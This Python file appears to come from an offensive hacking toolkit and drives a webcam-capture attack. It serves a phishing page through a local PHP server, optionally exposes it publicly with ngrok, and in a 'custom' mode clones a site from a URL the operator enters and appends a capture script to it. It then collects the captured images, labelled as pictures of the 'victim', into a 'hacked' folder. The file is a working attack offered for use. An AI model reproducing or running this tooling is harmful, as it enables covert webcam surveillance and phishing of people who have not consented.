
def webcam():
    from colorama import Fore , Style
    import time , os , sys , platform , subprocess , random , threading , psutil , datetime , requests
    from modules import banners
    banners.webcam_banner()
    time.sleep(0.1)
    banners.webcam_menu()
    select = input(Fore.LIGHTWHITE_EX + f"    Select > "+Fore.LIGHTRED_EX)

    def default():
        os.chdir("attacks")
        os.chdir("webcam")
        port = random.choice(range(1011,9999))
        def clear():
            if "Windows" in platform.uname():
                os.system("cls")
            else:
                os.system("clear")
        clear()
        banners.hacking()
        banners.hacking_menu()
        select = input(Fore.LIGHTWHITE_EX + f"    Select > "+Fore.LIGHTRED_EX)
        if select == "1":
            php_server_process = subprocess.Popen(["php","-S",f"localhost:{port}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            clear()
            x=5
            while x:
                banners.hacking()
                print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Localhost started , Port : {port}")
                input(Fore.LIGHTYELLOW_EX + "\033[1m" + f"\n    *TO STOP THE SERVER PRESS ENTER*")
                y_n = input(Fore.LIGHTRED_EX + "\033[1m" + f"\n    Are you Sure ? [ y / n ] "+ "\033[0m").lower()
                if y_n == "n":
                    clear()
                else:
                    x=0
            php_server_process.terminate()
            clear()
            banners.hacking()
            input(Fore.LIGHTGREEN_EX + "\n    Finished , Picture Of Victim In Hacked Folder...")
            pictures_names = []
            if "Windows" in platform.uname():
                pic_list = subprocess.getoutput("dir /b")
            else:
                pic_list = subprocess.getoutput("ls")
            for pic_name in pic_list.split(sep="\n"):
                if ".png" in pic_name or ".jpg" in pic_name:
                    pictures_names.append(pic_name)
            picture_data = []
            for pic in pictures_names:
                data = open(pic , mode="rb").read()
                picture_data.append(data)
            for name in pictures_names:
                os.remove(name)
            os.chdir("../../hacked")
            for image in picture_data:
                time_now = datetime.datetime.now()
                open(f"{time_now}.png","wb").write(image)
            time.sleep(1)
            clear()
            os.chdir("..")
        elif select == "2":
            clear()
            banners.hacking()
            print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Running Ngrok On {port} , Please Wait...")
            time.sleep(2)
            php_server_process = subprocess.Popen(["php","-S",f"localhost:{port}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            os.system(f"ngrok http {port}")
            php_server_process.terminate()
            clear()
            banners.hacking()
            input(Fore.LIGHTGREEN_EX + "\n    Finished , Picture Of Victim In Hacked Folder...")
            pictures_names = []
            if "Windows" in platform.uname():
                pic_list = subprocess.getoutput("dir /b")
            else:
                pic_list = subprocess.getoutput("ls")
            for pic_name in pic_list.split(sep="\n"):
                if ".png" in pic_name or ".jpg" in pic_name:
                    pictures_names.append(pic_name)
            picture_data = []
            for pic in pictures_names:
                data = open(pic , mode="rb").read()
                picture_data.append(data)
            for name in pictures_names:
                os.remove(name)
            os.chdir("../../hacked")
            for image in picture_data:
                time_now = datetime.datetime.now()
                open(f"{time_now}.png","wb").write(image)
            time.sleep(1)
            clear()
            os.chdir("..")
        else:
            os.chdir("../..")

    def custome():
        os.chdir("attacks")
        os.chdir("webcam")
        os.chdir("customize")
        def clear():
            if "windows" in platform.uname():
                os.system("cls")
            else:
                os.system("clear")
        clear()
        banners.hacking()
        url = input(Fore.LIGHTGREEN_EX + "\033[1m" + "\n    Please Enter The Url : "+ "\033[0m" + Fore.LIGHTRED_EX )
        print(Fore.LIGHTYELLOW_EX + "\n    Preparing The Page....")
        respone = requests.get(url=url).text
        script = open("sors.txt","r").read()
        sorse = f"""
{respone}
{script}
        """
        open("index.html",mode="w").write(sorse)
        time.sleep(1.5)
        port = random.choice(range(1011,9999))
        def clear():
            if "windows" in platform.uname():
                os.system("cls")
            else:
                os.system("clear")
        clear()
        banners.hacking()
        banners.hacking_menu2()
        select = input(Fore.LIGHTWHITE_EX + f"    Select > "+Fore.LIGHTRED_EX)
        if select == "1":
            php_server_process = subprocess.Popen(["php","-S",f"localhost:{port}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            clear()
            x=5
            while x:
                banners.hacking()
                print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Localhost started , Port : {port}")
                input(Fore.LIGHTYELLOW_EX + "\033[1m" + f"\n    *TO STOP THE SERVER PRESS ENTER*")
                y_n = input(Fore.LIGHTRED_EX + "\033[1m" + f"\n    Are you Sure ? [ y / n ] "+ "\033[0m").lower()
                if y_n == "n":
                    clear()
                else:
                    x=0
            php_server_process.terminate()
            clear()
            banners.hacking()
            input(Fore.LIGHTGREEN_EX + "\n    Finished , Picture Of Victim In Hacked Folder...")
            pictures_names = []
            if "windows" in platform.uname():
                pic_list = subprocess.getoutput("dir /b")
            else:
                pic_list = subprocess.getoutput("ls")
            for pic_name in pic_list.split(sep="\n"):
                if ".png" in pic_name or ".jpg" in pic_name:
                    pictures_names.append(pic_name)
            picture_data = []
            for pic in pictures_names:
                data = open(pic , mode="rb").read()
                picture_data.append(data)
            for name in pictures_names:
                os.remove(name)
            os.chdir("../../../hacked")
            for image in picture_data:
                time_now = datetime.datetime.now()
                open(f"{time_now}.png","wb").write(image)
            time.sleep(1)
            clear()
            os.chdir("..")
        elif select == "2":
            clear()
            banners.hacking()
            print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Running Ngrok On {port} , Please Wait...")
            time.sleep(2)
            php_server_process = subprocess.Popen(["php","-S",f"localhost:{port}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            os.system(f"ngrok http {port}")
            php_server_process.terminate()
            clear()
            banners.hacking()
            input(Fore.LIGHTGREEN_EX + "\n    Finished , Picture Of Victim In Hacked Folder...")
            pictures_names = []
            if "Windows" in platform.uname():
                pic_list = subprocess.getoutput("dir /b")
            else:
                pic_list = subprocess.getoutput("ls")
            for pic_name in pic_list.split(sep="\n"):
                if ".png" in pic_name or ".jpg" in pic_name:
                    pictures_names.append(pic_name)
            picture_data = []
            for pic in pictures_names:
                data = open(pic , mode="rb").read()
                picture_data.append(data)
            for name in pictures_names:
                os.remove(name)
            os.chdir("../../../hacked")
            for image in picture_data:
                time_now = datetime.datetime.now()
                open(f"{time_now}.png","wb").write(image)
            time.sleep(1)
            clear()
            os.chdir("..")
        else:
            os.chdir("../../..")

    if select == "1":
        default()
    elif select == "2":
        custome()
    else:
        pass